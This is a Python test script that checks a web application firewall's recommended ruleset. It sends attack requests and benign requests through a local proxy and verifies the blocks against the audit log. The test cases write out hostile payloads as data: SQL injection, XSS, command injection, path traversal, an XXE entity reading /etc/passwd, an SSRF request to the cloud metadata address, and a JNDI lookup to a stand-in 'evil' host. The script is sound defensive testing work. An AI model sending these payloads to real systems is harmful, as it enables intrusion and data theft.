#!/usr/bin/env python3
"""Run examples/rulesets/recommended.yaml in a real proxy and check each rule.

For every rule: one request that should match it (and be blocked, or for
log/score rules, recorded) and one ordinary request that must pass. The
matched rule ids are read from the audit log, so a request blocked by the
wrong rule counts as a failure.

Usage: cargo build --release --workspace && python3 tests/rulesets/check_recommended.py
"""

import json
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from urllib.parse import quote

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tests" / "e2e"))
from run_e2e import BIN, request, wait_port  # noqa: E402

PROXY = ("127.0.0.1", 18390)
UPSTREAM = "127.0.0.1:13390"
q = lambda s: quote(s, safe="")  # noqa: E731

# (rule id, method, path, headers, body, expect blocked)
ATTACKS = [
    ("sqli-args", "GET", "/p?id=" + q("1' OR '1'='1"), {}, b"", True),
    ("sqli-cookies", "GET", "/p", {"Cookie": "s=" + q("1' UNION SELECT password FROM users--")}, b"", True),
    ("sqli-form", "POST", "/f", {"Content-Type": "application/x-www-form-urlencoded"}, b"q=" + q("1' OR '1'='1").encode(), True),
    ("xss-args", "GET", "/p?q=" + q("<script>alert(1)</script>"), {}, b"", True),
    ("xss-form", "POST", "/f", {"Content-Type": "application/x-www-form-urlencoded"}, b"c=" + q("<img src=x onerror=alert(1)>").encode(), True),
    ("xss-uri-scheme", "GET", "/p?next=" + q("javascript:alert(1)"), {}, b"", True),
    ("traversal-uri", "GET", "/files/../../etc/x", {}, b"", True),
    ("lfi-targets", "GET", "/p?file=" + q("/etc/passwd"), {}, b"", True),
    ("cmdi-args", "GET", "/p?host=" + q("x; whoami"), {}, b"", True),
    ("cmdi-form", "POST", "/f", {"Content-Type": "application/x-www-form-urlencoded"}, b"host=" + q("x && whoami").encode(), True),
    ("ssrf-internal-url", "GET", "/p?url=" + q("http://169.254.169.254/latest"), {}, b"", True),
    ("jndi-lookup", "GET", "/p", {"X-Api-Version": "${jndi:ldap://evil/a}"}, b"", True),
    ("ssti-args", "GET", "/p?name=" + q("{{config.items()}}"), {}, b"", True),
    ("xxe-body", "POST", "/x", {"Content-Type": "application/xml"}, b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY e SYSTEM "file:///etc/passwd">]><a>&e;</a>', True),
    ("nosql-operators", "GET", "/p?user[$ne]=x", {}, b"", True),
    ("nosql-json-body", "POST", "/j", {"Content-Type": "application/json"}, b'{"user": {"$ne": null}}', True),
    ("scanner-user-agent", "GET", "/", {"User-Agent": "sqlmap/1.7"}, b"", True),
    ("sensitive-files", "GET", "/.env", {}, b"", True),
    ("sensitive-files", "GET", "/.git/config", {}, b"", True),
]

BENIGN = [
    ("GET", "/", {}, b""),
    ("GET", "/buat?paket=standard&_rsc=abc123", {}, b""),
    ("GET", "/undangan/andi-dan-sari?ref=instagram", {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X)"}, b""),
    ("GET", "/search?q=" + q("kartu ucapan pernikahan & ulang tahun"), {}, b""),
    ("GET", "/p?next=" + q("/dashboard/orders"), {}, b""),
    ("GET", "/p?email=" + q("o'brien@example.com"), {}, b""),
    ("POST", "/api/rsvp", {"Content-Type": "application/json"}, b'{"name": "Budi", "guests": 2, "message": "Selamat ya! Semoga bahagia :)"}', ),
    ("POST", "/f", {"Content-Type": "application/x-www-form-urlencoded"}, b"name=" + q("Siti & Rudi").encode() + b"&note=" + q("Datang jam 10.00; bawa 2 orang").encode()),
    ("GET", "/static/app.js?v=1.2.3", {}, b""),
    ("GET", "/env-info", {}, b""),
]

CONFIG = f"""
listen: "{PROXY[0]}:{PROXY[1]}"
upstream: "http://{UPSTREAM}"
workers: 1
pid_file: "__DIR__/p.pid"
upgrade_sock: "__DIR__/u.sock"
logging:
  format: json
  access_log: /dev/null
  audit_log: "__DIR__/audit.log"
"""


def main():
    d = Path(tempfile.mkdtemp(prefix="openshield-rules-"))
    rules = (ROOT / "examples" / "rulesets" / "recommended.yaml").read_text()
    rules = rules[rules.index("scores:"):]
    (d / "c.yaml").write_text(CONFIG.replace("__DIR__", str(d)) + rules)
    up = subprocess.Popen([str(BIN / "echo-upstream"), UPSTREAM], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    px = subprocess.Popen([str(BIN / "openshield"), "-c", str(d / "c.yaml")], stdout=subprocess.DEVNULL, stderr=open(d / "proxy.log", "wb"))
    results, ok = [], True
    try:
        if not (wait_port(PROXY) and wait_port(("127.0.0.1", 13390))):
            raise SystemExit("proxy did not start; see " + str(d / "proxy.log"))
        sent = []
        for rid, m, path, h, body, blocked in ATTACKS:
            r = request(m, path, h, body, addr=PROXY)
            sent.append(("attack", rid, m + " " + path, r.status, r.header("x-request-id"), blocked))
        for m, path, h, body in BENIGN:
            r = request(m, path, h, body, addr=PROXY)
            sent.append(("benign", "", m + " " + path, r.status, r.header("x-request-id"), False))
        time.sleep(0.6)
        matched = {}
        for line in (d / "audit.log").read_text().splitlines():
            try:
                e = json.loads(line)
            except ValueError:
                continue
            matched[e.get("request_id")] = [x["id"] for x in e.get("waf_matched_rules", [])]
        for kind, rid, what, status, req_id, want_block in sent:
            ids = matched.get(req_id, [])
            if kind == "attack":
                good = status == 403 and rid in ids
            else:
                good = status != 403 and not ids
            ok &= good
            results.append({"kind": kind, "rule": rid, "request": what, "status": status, "matched": ids, "ok": good})
            print(("PASS" if good else "FAIL"), kind, rid or "-", what[:70], status, ids)
    finally:
        for p in (px, up):
            p.terminate()
            try:
                p.wait(timeout=3)
            except subprocess.TimeoutExpired:
                p.kill()
    out = ROOT / "reports" / "evidence" / "ruleset-recommended-check.json"
    out.write_text(json.dumps({"time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "results": results}, indent=2))
    covered = {r for r, *_ in ATTACKS}
    defined = {l.split("id:")[1].strip() for l in rules.splitlines() if l.strip().startswith("- id:")}
    print(f"\n{sum(r['ok'] for r in results)}/{len(results)} passed; rules without an attack case: {sorted(defined - covered)}")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
